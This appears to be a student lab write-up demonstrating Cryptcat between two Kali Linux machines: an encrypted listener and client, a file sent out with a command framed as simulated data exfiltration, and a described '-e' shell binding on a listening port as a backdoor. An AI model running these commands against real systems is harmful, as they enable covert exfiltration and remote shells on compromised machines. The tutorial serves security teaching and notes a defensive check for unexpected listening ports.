# Cryptcat

This demo shows how encrypted communication channels can be established between two systems using Cryptcat. This simulates how attackers may maintain persistent, covert communication after gaining access to a system. Cryptcat is an enhanced version of Netcat that supports encryption via symmetric key authentication.

---
## Lab Environment
- Attacker Machine: Kali Linux (Terminal 1)
- Target Machine: Kali Linux (Terminal 2) / Lab VM

## Steps
### Feature 1: Encrypted communication channel
#### Step A - Start Encrypted Listener

```bash
cryptcat -l -p 4444 -k testkey
```
Parameters:
- -l means Listen Mode 
- -p 4444 means specifies port number
- -k testkey means encryption key
  
 <img width="728" height="87" alt="1" src="https://github.com/user-attachments/assets/089ab680-c3e4-4d08-ba14-f74c696217ad" />

This command creates an encrypted communication endpoint waiting for a remote system to connect.

#### Step b - Connect from client side
```bash
cryptcat <IP> 4444 -k testkey
```

<img width="728" height="97" alt="2" src="https://github.com/user-attachments/assets/5177f60e-0c0d-4606-96b3-5580565f4dd9" />

Parameters:
- <ip> means Listener IP
- 4444 means Port number
- -k testkey → Must match the listener key

This establishes an encrypted TCP session between two machines.
Both sides can now exchange data securely.

#### Step C - Secure message exchange
After connected, typed in messages

<img width="745" height="704" alt="3" src="https://github.com/user-attachments/assets/11949796-979b-483f-a634-1bb809da79d3" />


This demonstration shows that Cryptcat is capable of establishing bidirectional encrypted communication between two systems. Once the connection is successfully initiated, the session remains active, allowing continuous interaction between both endpoints. This enables real-time command execution and data exchange over an encrypted channel.

### Feature 2: Encrypted File Transfer
#### Step A - Prepare File
```bash
echo "this is test file from terminal 2" > secret.txt
```
<img width="719" height="182" alt="Screenshot 2026-02-25 211310" src="https://github.com/user-attachments/assets/af009849-ae01-477c-9e16-cc786097ca81" />

Creates a sample file to simulate data exfiltration.

#### Step B - Start receiving side
```bash
cryptcat -l -p 5555 -k filekey > received.txt
```
<img width="795" height="228" alt="Screenshot 2026-02-25 211407" src="https://github.com/user-attachments/assets/20adb3bb-c365-4a80-9f5f-7d556e4a7462" />

This command configures to listen for incoming connections on port 5555. It applies a predefined encryption key to ensure that all transmitted data is encrypted during the communication session. Additionally, the output redirection operator saves the incoming data stream into a local file named received.txt, thereby allowing the system to store the transferred content for later verification or analysis.

 #### Step C - Send File

```bash
cryptcat <IP> 5555 -k filekey < secret.txt
```
<img width="715" height="49" alt="Screenshot 2026-02-25 211527_new" src="https://github.com/user-attachments/assets/f10102ae-acb2-436b-860d-d2b8ed0a41ff" />

```bash < secret.txt``` sends file contents
Encrypted during transmission

this demonstrate secure file transfer channel.


#### Step D - Verifying file
```bash
cat received.txt
```
<img width="711" height="81" alt="Screenshot 2026-02-25 211527-9" src="https://github.com/user-attachments/assets/c796efce-512d-489e-be4f-1ded11b8d580" />

the commands used to check the file transfer. This confirms successful encrypted file transfer.

### Feature 3 - Remote Shell Capability

<img width="745" height="704" alt="3" src="https://github.com/user-attachments/assets/d9784d0e-d203-456c-ad16-bad49392c07a" />


Cryptcat supports execution of a program upon connection using the `-e` option. 
This enables binding a system shell to a listening port.

Purpose:
This allows a remote user to execute system commands over an encrypted channel. If unauthorized, this can create a backdoor listener on a compromised machine. From a defensive perspective, monitoring unexpected listening ports is critical.

---
## References
pAKCl9lImpU. (n.d.). Cryptcat tutorial [Video]. YouTube. https://youtu.be/pAKCl9lImpU

OpenAI. (2024). ChatGPT (February 27 version) [Large language model]. https://chat.openai.com/
